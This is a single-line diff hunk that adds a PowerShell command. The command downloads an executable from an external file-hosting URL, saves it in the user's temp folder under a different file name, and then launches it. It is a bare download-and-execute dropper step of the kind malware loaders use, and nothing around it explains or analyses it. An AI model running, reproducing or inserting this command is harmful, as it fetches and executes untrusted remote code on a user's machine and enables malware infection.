@@ -1,0 +1,1 @@
+(New-Object System.Net.WebClient).DownloadFile('https://a.pomf.cat/klckcp.exe',"$env:TEMPceder_011.exe");Start-Process ("$env:TEMPceder_011.exe")
